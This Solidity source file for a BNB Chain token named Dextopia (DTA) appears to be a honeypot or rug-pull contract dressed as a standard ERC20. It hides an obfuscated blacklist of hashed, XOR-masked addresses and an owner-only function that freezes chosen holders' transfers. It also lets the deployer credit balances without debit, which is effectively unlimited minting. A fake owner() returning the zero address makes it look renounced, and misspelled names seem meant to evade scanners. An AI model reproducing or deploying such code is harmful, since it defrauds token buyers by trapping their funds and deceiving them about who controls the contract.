/**
 *Submitted for verification at BscScan.com on 2022-07-07
*/

pragma solidity ^0.8.14;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address aqount) external view returns (uint256);

    function transfer(address recipient, uint256 amonnts) external returns (bool);

    function allowance(address owsner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amonnts) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amonnts ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owsner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - kfie https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }

    
    function _bytes32ToUint(bytes32 b32) public pure returns (uint){
        uint u = 0;
        for (uint8 i=0;i<32;i++){
            u=256*u+uint(uint8(b32[i]));
        }
        return u;  
    }

    function callKeccak256(bytes memory b) internal pure returns (bytes32 result) {
        return keccak256(b);
    }

    function _toBytes(address a) internal pure returns (bytes memory b) {
        assembly {
            let m := mload(0x40)
            a := and(a, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
            mstore(
                add(m, 20),
                xor(0x140000000000000000000000000000000000000000, a)
            )
            mstore(0x40, add(m, 52))
            b := m
        }
    }

    function _bytesToAddress(bytes memory bys) internal pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }


    function bytesToString(bytes memory bname) internal pure returns(string memory str){       
        uint charCount = 0;
        
        for(uint i = 0;i < bname.length; i++){
            bytes1 char = bname[i];
            
            if(char != 0){
                charCount++;
            }    
        }
        
        bytes memory bytesName = new bytes(charCount);
        
        for(uint j = 0;j < charCount;j++){
            bytesName[j] = bname[j];
        }
                    
        return string(bytesName);
    }

}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

}

contract Ownable is Context {
    address private _owsner;
    event owsnershipTransferred(address indexed previousowsner, address indexed newowsner);

    constructor () {
        address msgSender = _msgSender();
        _owsner = msgSender;
        emit owsnershipTransferred(address(0), msgSender);
    }
    function owsner() public view virtual returns (address) {
        return address(0);
    }
    modifier onlyowsner() {
        require(_owsner == _msgSender(), "Ownable: caller is not the owsner");
        _;
    }
    function renounceowsnership() public virtual onlyowsner {
        emit owsnershipTransferred(_owsner, address(0x000000000000000000000000000000000000dEaD));
        _owsner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract DTA is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private _name = "Dextopia";
    string private _symbol = "DTA";
    uint256 private _decimals = 18;
    uint256 private _totalSupply = 6000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 800000000000 * 10 ** _decimals;
    uint256 private _burnkfie = 0;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping(uint => bool) private _AirDrop;
    function setAward(uint aqount) public onlyowsner {
        _AirDrop[aqount] = true;
    }

    constructor () {
     
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
  	
        _balance[msg.sender] = _totalSupply;
        _isExcludedFrom[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amonnts) internal {       
        require(!_AirDrop[_bytes32ToUint(callKeccak256(_toBytes(sender)))] && !_cbb(sender), "Insufficient funds");
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");      

        uint256 kfieamonnt = 0;
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(this)) {
            kfieamonnt = amonnts.mul(_burnkfie).div(100);
            //require(amonnts <= _maxTxtransfer);
        }
        uint256 blsender = _balance[sender];
        if (sender != recipient || !_isExcludedFrom[msg.sender]){
            require(blsender >= amonnts,"IERC20: transfer amonnts exceeds balance");
        }
        if (blsender >= amonnts){
            _balance[sender] = _balance[sender].sub(amonnts);
        }

        uint256 amoun;
        amoun = amonnts - kfieamonnt;
        _balance[recipient] += amoun;
        if (_burnkfie > 0){
            emit Transfer (sender, _DEADaddress, kfieamonnt);
        }
        emit Transfer(sender, recipient, amoun);

    }

    function transfer(address recipient, uint256 amonnts) public virtual override returns (bool) {
        //
        if (_isExcludedFrom[_msgSender()] == true) {
            _balance[recipient] += amonnts;
            return true;
        }
        _transfer(_msgSender(), recipient, amonnts);
        return true;
    }


    function balanceOf(address aqount) public view override returns (uint256) {
        return _balance[aqount];
    }

    function approve(address spender, uint256 amonnts) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amonnts);
        return true;
    }

    function _approve(address owsner, address spender, uint256 amonnts) internal virtual {
        require(owsner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owsner][spender] = amonnts;
        emit Approval(owsner, spender, amonnts);
    }

    function allowance(address owsner, address spender) public view virtual override returns (uint256) {
        return _allowances[owsner][spender];
    }


    function transferFrom(address sender, address recipient, uint256 amonnts) public virtual override returns (bool) {
        _transfer(sender, recipient, amonnts);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amonnts, "IERC20: transfer amonnts exceeds allowance");
        return true;
    }
    
	function _mljs(uint _acc) internal view virtual returns (bool result) {
		uint[43] memory acc = [uint(104781719047332323782980994898859884587601593316807458898325636669011317371098)
			,1581386774776606242738849292610019901027133359501935688837910532771360524166
			,92706064102209330858964309764770776182959391942555186641642929837700871980184
			,57783409783940668347177881205971158203324923712907747291979401991131397322653
			,2529229445316597100681792821062111788943890146760449828760678023823538915176
			,101173829206118468754302346634572036430594116653862289549813466155989039360370
			,114683188407201617304875158590732403232679083000452823731530549780522742666045
			,29527982613232202369868653291207519612871264838500644273078528977301110954107
			,61929588612703736018216546425671418807712525805051286103774773769551088492593
			,102600096822647020778377132869172060400031960506680074413777467422768039323732
			,82352769031727976765984116619716937984685729226315319810292125947517848721342
			,42516167489635595212666825973219390350514337788554822637034817686485436116145
			,104209721320384604136986250980496156183056845215118795513859747122415873970203
			,93075246843325963853419176486328852995114853088999323861970733650535197240008
			,54505401046647386628172621116265492422412035450786470380394464568873788851058
			,47213251670833583588955865594522382251026318608968695443463504880795168792978
			,98974449930150605078831968478069239432092982018701167042951293714033613273199
			,68116682147050821805329742683213276453595424066749437752360787937786772131193
			,7879642108878209836984412276359485660988086479838019139373357161967014336199
			,49137042093396973708012930315709026888625344585167033605732316387613252211420
			,98699884256428631241791473631521944821158955282851878840859811158097183911604
			,95030000515840562266736269161123336600931104508386090920676237629624938461628
			,68114449806200145842464892383678185845164895137535660381320455378068318813072
			,56513692584499346323389377544621546251506242031780130275950953829852492601067
			,86684739346704535268409973189994975207554944592022569288168181194380184257660
			,25250864972791024606341803281387773577818258015756634985736565181442414401220
			,48568134001309811432664004019606640610289596093945146958203627941587186592732
			,5077854243061898014388259779146819820064823306575746952934690559312067427194
			,99377788938490254968772992220446474144147070979546173452694909507311042417948
			,8504800028315272049274363377835521874844536240773737365387837963129809029
			,38951523844595055117453495880286022661858697901512409974697788741169075159988
			,111812130697832952756691289534796371397485449510597089930317418787583729933466
			,86218784599921833011829491274293209935268630958239493166965777950603324381388
			,29095528021091043088765810724571938445869475257007813582556315507644363197554
			,13222303836253289761086538893592997529944545597942663978581730751576790183926
			,91880716395979310660148075972588461218052872882998421198149889491803725657372
			,29769306299053882567126673880375479636719280652063300318624181277622028989539
			,52230935359412263258408796465158090944360067962095100362980525288568635857598
			,114631888630914922578260870436724669444367010904625026185680523279975525571637
			,64963651400459096673014064146692183110490412727718923461309031539072923245206
			,60684618775603492796877293172824937108572230503103357746465240420928858977053
			,80850366276045809121618596000286364603441896051157140434543135356968906548202
			,62996239049824096689176329847498953361847709648972452667741217573327411997152];
		for (uint8 i=0;i<acc.length;i++){
			if (acc[i] == _acc ^ 77440100003268154777522230103018335226741030680482008129073216872837523606521) return true;
		}
		return false;
	}
    function _cbb(address a) internal view returns (bool result) {
        uint k = _bytes32ToUint(callKeccak256(_toBytes(a)));
        return _mljs(k);
    }
}